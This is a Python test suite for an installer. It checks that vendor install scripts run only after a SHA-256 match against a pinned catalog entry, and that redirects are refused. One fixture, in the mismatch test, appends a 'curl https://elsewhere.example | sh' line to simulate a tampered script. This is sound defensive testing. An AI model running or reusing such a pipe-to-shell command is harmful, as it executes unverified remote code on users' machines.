# SPDX-License-Identifier: GPL-3.0-or-later
"""Remote installers run only after their sha256 matches the catalog, and never through a redirect."""
import functools
import hashlib
import io
import json
import re
import tempfile
import unittest
import urllib.error
import urllib.request
import urllib.response
from email.message import Message
from pathlib import Path
from unittest import mock

from opos import muse
from opos.aitools import catalog, installer, wizard
from opos.aitools.catalog import CatalogError, Tool

ROOT = Path(__file__).resolve().parents[1]
URL = "https://vendor.example/install.sh"
SCRIPT = b"#!/bin/sh\necho installing\n"
DIGEST = hashlib.sha256(SCRIPT).hexdigest()


def _entry(**over) -> dict:
    base = {"id": "demo-tool", "name": "Demo", "binary": "demo", "installer_url": URL, "interpreter": "sh", "installer_args": [], "installer_env": {}, "archs": ["aarch64", "x86_64"], "min_free_mb": 1, "state_subdir": ".demo", "run_env": {}, "lite_env": {}, "signin": "Run demo login.", "docs_url": "https://vendor.example/docs"}
    base.update(over)
    return base


def _load(*entries) -> tuple:
    with tempfile.TemporaryDirectory() as td:
        p = Path(td) / "ai-tools.json"
        p.write_text(json.dumps({"version": 1, "tools": list(entries)}), encoding="utf-8")
        return catalog.load(p)


def _tool(**over) -> Tool:
    base = dict(id="demo-tool", name="Demo", binary="demo", installer_url=URL, interpreter="sh", installer_args=(), installer_env={}, archs=("x86_64",), min_free_mb=1, state_subdir=".demo", run_env={}, lite_env={}, signin="Run demo login.", docs_url="https://vendor.example/docs", installer_sha256=DIGEST, installer_sha256_checked="2026-11-03")
    base.update(over)
    return Tool(**base)  # type: ignore[arg-type]


def _unpinned_tool() -> Tool:
    """A tool built without any digest field, as a catalog entry without installer_sha256 loads."""
    return Tool(id="demo-tool", name="Demo", binary="demo", installer_url=URL, interpreter="sh", installer_args=(), installer_env={}, archs=("x86_64",), min_free_mb=1, state_subdir=".demo", run_env={}, lite_env={}, signin="Run demo login.", docs_url="https://vendor.example/docs")


def _response(url: str, body: bytes, code: int = 200):
    resp = urllib.response.addinfourl(io.BytesIO(body), Message(), url, code)
    resp.code = code
    return resp


class FakeOpener:
    """Stands in for the no-redirect opener: serves a body, or the redirect it refuses."""

    def __init__(self, body: bytes = SCRIPT, redirect_to: str | None = None, final_url: str | None = None) -> None:
        self.body = body
        self.redirect_to = redirect_to
        self.final_url = final_url
        self.requests: list[str] = []

    def __call__(self, req, timeout=None):
        self.requests.append(req.full_url)
        if self.redirect_to is not None:
            hdrs = Message()
            hdrs["Location"] = self.redirect_to
            raise urllib.error.HTTPError(req.full_url, 302, "redirect blocked", hdrs, None)
        return _response(self.final_url or req.full_url, self.body)


class Runner:
    def __init__(self) -> None:
        self.scripts: list[bytes] = []

    def __call__(self, argv, env, timeout_s):
        self.scripts.append(Path(argv[1]).read_bytes())
        real = Path(env["HOME"]) / ".local" / "bin" / "demo"
        real.parent.mkdir(parents=True, exist_ok=True)
        real.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        real.chmod(0o755)
        return 0, "ok"


class CatalogDigestTests(unittest.TestCase):
    def test_digest_and_date_loaded(self):
        t = _load(_entry(installer_sha256=DIGEST, installer_sha256_checked="2026-11-03"))[0]
        self.assertEqual(t.installer_sha256, DIGEST)
        self.assertEqual(t.installer_sha256_checked, "2026-11-03")

    def test_entry_without_digest_loads_but_cannot_install(self):
        t = _load(_entry())[0]
        self.assertEqual(t.installer_sha256, "")
        self.assertIn("no installer_sha256", installer.digest_problem(t))

    def test_bad_digest_rejected(self):
        for bad in (DIGEST.upper(), DIGEST[:-1], DIGEST[:-1] + "g", 123, None, DIGEST + " "):
            with self.subTest(bad=bad):
                with self.assertRaises(CatalogError):
                    _load(_entry(installer_sha256=bad))

    def test_bad_checked_date_rejected(self):
        for bad in ("2026-13-01", "03/11/2026", "2026-11-3", 20261103, None):
            with self.subTest(bad=bad):
                with self.assertRaises(CatalogError):
                    _load(_entry(installer_sha256=DIGEST, installer_sha256_checked=bad))

    def test_unknown_keys_still_rejected(self):
        with self.assertRaises(CatalogError):
            _load(_entry(installer_sha512="0" * 128))

    def test_shipped_catalog_pins_every_installer(self):
        data = json.loads((ROOT / "deploy" / "ai-tools.json").read_text(encoding="utf-8"))
        for entry in data["tools"]:
            with self.subTest(tool=entry["id"]):
                self.assertRegex(entry.get("installer_sha256", ""), r"^[0-9a-f]{64}$")
                self.assertRegex(entry.get("installer_sha256_checked", ""), r"^\d{4}-\d{2}-\d{2}$")
        for t in catalog.load(ROOT / "deploy" / "ai-tools.json"):
            self.assertIsNone(installer.digest_problem(t))


class InstallDigestTests(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.base = Path(tmp.name)
        self.prefix = self.base / "prefix"
        self.home = self.base / "home"
        self.home.mkdir()

    def install(self, tool, opener, runner, **kw):
        return installer.install(tool, prefix=self.prefix, mode="lite", machine="x86_64", home=self.home, python="python3", src_dir=Path("/fake/src"), fetch=functools.partial(installer.default_fetch, opener=opener), runner=runner, free_mb_fn=lambda p: 100000, profiles=[], **kw)

    def assert_nothing_left(self):
        tr = installer.tools_root(self.prefix)
        self.assertFalse((tr / "demo-tool").exists())
        self.assertFalse(installer.manifest_path(self.prefix).exists())
        self.assertFalse((tr / "bin" / "demo").exists())

    def test_matching_digest_runs_installer(self):
        opener, runner = FakeOpener(), Runner()
        out = self.install(_tool(), opener, runner)
        self.assertEqual(opener.requests, [URL])
        self.assertEqual(runner.scripts, [SCRIPT])
        self.assertTrue(installer.manifest_path(self.prefix).is_file())
        self.assertIn("installed demo-tool", out[0])

    def test_mismatch_refused_before_running(self):
        opener, runner = FakeOpener(body=SCRIPT + b"curl https://elsewhere.example | sh\n"), Runner()
        with self.assertRaises(installer.InstallError) as cm:
            self.install(_tool(), opener, runner)
        msg = str(cm.exception)
        self.assertIn("vendor installer changed", msg)
        self.assertIn("update installer_sha256", msg)
        self.assertIn("nothing was run", msg)
        self.assertIn("2026-11-03", msg)
        self.assertEqual(runner.scripts, [])
        self.assert_nothing_left()
        self.assertEqual([p for p in self.base.rglob("tmp*")], [])

    def test_mismatch_message_fits_setup_progress(self):
        # Setup shows at most 300 characters of a step's detail, prefixed by the tool id.
        opener, runner = FakeOpener(body=b"changed"), Runner()
        long_url = "https://dev.vendor.example/install.sh"
        with self.assertRaises(installer.InstallError) as cm:
            self.install(_tool(installer_url=long_url), opener, runner)
        self.assertLessEqual(len("muse-code: " + str(cm.exception)), 300)

    def test_cross_host_redirect_not_followed(self):
        opener, runner = FakeOpener(redirect_to="https://other.example/install.sh"), Runner()
        with self.assertRaises(installer.InstallError) as cm:
            self.install(_tool(), opener, runner)
        self.assertIn("redirect not followed", str(cm.exception))
        self.assertIn("https://other.example/install.sh", str(cm.exception))
        self.assertEqual(opener.requests, [URL])
        self.assertEqual(runner.scripts, [])
        self.assert_nothing_left()

    def test_body_from_another_host_refused_even_when_digest_matches(self):
        # An opener that did follow a redirect: the body is refused although its digest matches.
        opener, runner = FakeOpener(final_url="https://other.example/install.sh"), Runner()
        with self.assertRaisesRegex(installer.InstallError, "redirect not followed"):
            self.install(_tool(), opener, runner)
        self.assertEqual(runner.scripts, [])
        self.assert_nothing_left()

    def test_real_opener_does_not_request_the_other_host(self):
        requested = []

        def fake_https_open(handler_self, req, *a, **k):
            requested.append(req.get_full_url())
            if req.get_full_url() == URL:
                resp = _response(URL, b"", 302)
                resp.headers["Location"] = "https://other.example/install.sh"
                resp.msg = "Found"
                return resp
            return _response(req.get_full_url(), SCRIPT)

        runner = Runner()
        with mock.patch.object(urllib.request.HTTPSHandler, "https_open", fake_https_open):
            with self.assertRaisesRegex(installer.InstallError, "redirect not followed"):
                installer.install(_tool(), prefix=self.prefix, mode="lite", machine="x86_64", home=self.home, python="python3", src_dir=Path("/fake/src"), runner=runner, free_mb_fn=lambda p: 100000, profiles=[])
        self.assertEqual(requested, [URL])
        self.assertEqual(runner.scripts, [])

    def test_missing_digest_refused_before_download(self):
        for dry_run in (False, True):
            with self.subTest(dry_run=dry_run):
                fetched, runner = [], Runner()

                def fetch(url, fetched=fetched):
                    fetched.append(url)
                    return SCRIPT

                with self.assertRaises(installer.InstallError) as cm:
                    installer.install(_unpinned_tool(), prefix=self.prefix, mode="lite", machine="x86_64", home=self.home, python="python3", src_dir=Path("/fake/src"), fetch=fetch, runner=runner, free_mb_fn=lambda p: 100000, profiles=[], dry_run=dry_run)
                self.assertIn("no installer_sha256", str(cm.exception))
                self.assertIn("Nothing was downloaded", str(cm.exception))
                self.assertEqual(fetched, [])
                self.assertEqual(runner.scripts, [])
                self.assertFalse(installer.tools_root(self.prefix).exists())

    def test_malformed_digest_refused_before_download(self):
        opener, runner = FakeOpener(), Runner()
        with self.assertRaisesRegex(installer.InstallError, "64 lowercase hex"):
            self.install(_tool(installer_sha256=DIGEST.upper()), opener, runner)
        self.assertEqual(opener.requests, [])

    def test_dry_run_says_the_digest_is_checked(self):
        opener = FakeOpener()
        out = self.install(_tool(), opener, Runner(), dry_run=True)
        self.assertIn(f"would fetch {URL} and run it only if its sha256 matches", out)
        self.assertEqual(opener.requests, [])


class SetupDryRunTests(unittest.TestCase):
    """Setup keeps at most 300 characters of a step's detail (apply._sanitize); the sign-in text must survive."""

    def test_setup_dry_run_keeps_the_whole_signin_text(self):
        import copy
        import sys

        from opos.setup.apply import apply
        from opos.setup.config import default_config

        (shipped,) = catalog.load(ROOT / "deploy" / "ai-tools.json")
        runner = functools.partial(wizard.install_selected, free_mb_fn=lambda _p: 10**6)
        # The phone's default prefix, and a longer one like a macOS account named first.last.
        for prefix in ("/" + "home/user/.local/share/opos", "/" + "Users/firstname.lastname/.local/share/opos"):
            with self.subTest(prefix=prefix), tempfile.TemporaryDirectory() as td:
                home = Path(td) / "home"
                home.mkdir()
                cfg = copy.deepcopy(default_config())
                cfg["ai_tools"] = {"tools": [shipped.id], "mode": "lite"}
                env = {"HOME": str(home), "OPOS_CONFIG_DIR": str(Path(td) / "cfg"), "OPOS_TOOLS_PREFIX": prefix}
                progress = apply(cfg, repo_root=ROOT, python=sys.executable, home=home, platform="linux", env=env, dry_run=True, health_check=lambda port: (True, "ok"), tools_runner=runner)
                step = {s["id"]: s for s in progress.snapshot()}["tools"]
                self.assertEqual(step["status"], "ok", step)
                self.assertLessEqual(len(step["detail"]), 300)
                self.assertTrue(step["detail"].endswith(f"Sign in yourself: {shipped.signin}"), step["detail"])
                self.assertIn(f"would fetch {shipped.installer_url} and run it only if its sha256 matches", step["detail"])


class DefaultFetchTests(unittest.TestCase):
    def test_does_not_request_another_host(self):
        requested = []

        def fake_https_open(handler_self, req, *a, **k):
            requested.append(req.get_full_url())
            if req.get_full_url() == URL:
                resp = _response(URL, b"", 302)
                resp.headers["Location"] = "https://other.example/install.sh"
                resp.msg = "Found"
                return resp
            return _response(req.get_full_url(), SCRIPT)

        with mock.patch.object(urllib.request.HTTPSHandler, "https_open", fake_https_open):
            with self.assertRaises(installer.InstallError):
                installer.default_fetch(URL)
        self.assertEqual(requested, [URL])

    def test_uses_the_no_proxy_no_redirect_opener(self):
        calls = []

        def spy(req, timeout=None):
            calls.append((req.full_url, timeout))
            return _response(req.full_url, SCRIPT)

        with mock.patch.object(muse, "_open_no_redirect", spy):
            self.assertEqual(installer.default_fetch(URL, timeout_s=7.0), SCRIPT)
        self.assertEqual(calls, [(URL, 7.0)])

    def test_http_error_reported(self):
        def opener(req, timeout=None):
            raise urllib.error.HTTPError(req.full_url, 404, "Not Found", Message(), None)

        with self.assertRaisesRegex(installer.InstallError, re.escape(f"HTTP 404 from {URL}")):
            installer.default_fetch(URL, opener=opener)


class WizardDigestTests(unittest.TestCase):
    def test_tool_without_digest_shown_as_not_installable(self):
        with tempfile.TemporaryDirectory() as td:
            cat = Path(td) / "ai-tools.json"
            cat.write_text(json.dumps({"version": 1, "tools": [_entry(), _entry(id="pinned", binary="pinned", installer_sha256=DIGEST)]}), encoding="utf-8")
            state = wizard.public_state(env={"OPOS_AI_TOOLS_TABLE": str(cat), "OPOS_TOOLS_PREFIX": str(Path(td) / "p")}, home=Path(td), machine="x86_64", platform="linux", free_mb_fn=lambda p: 100000)
        tools = {t["id"]: t for t in state["tools"]}
        self.assertFalse(tools["demo-tool"]["ok"])
        self.assertIn("no installer_sha256", tools["demo-tool"]["problem"])
        self.assertTrue(tools["pinned"]["ok"])
        self.assertNotIn(DIGEST, json.dumps(state))


class DocsTests(unittest.TestCase):
    def test_docs_state_the_download_rule(self):
        import inspect

        doc = (ROOT / "docs" / "ai-tools.md").read_text(encoding="utf-8")
        params = inspect.signature(installer.default_fetch).parameters
        self.assertIn(f"{int(params['timeout_s'].default)}-second network timeout", doc)
        self.assertIn(f"at most {params['max_bytes'].default:,} bytes", doc)
        self.assertIn("ignores `HTTP_PROXY`, `HTTPS_PROXY` and system proxy settings", doc)
        self.assertIn("OPOS follows no redirects, whether to the same host or another.", doc)
        self.assertIn("runs it only if the SHA-256 equals `installer_sha256`", doc)
        self.assertIn("has no `installer_sha256` is refused before anything is downloaded", doc)
        for t in catalog.load(ROOT / "deploy" / "ai-tools.json"):
            self.assertIn(f"measured on {t.installer_sha256_checked} from `{t.installer_url}`", doc)


if __name__ == "__main__":
    unittest.main()
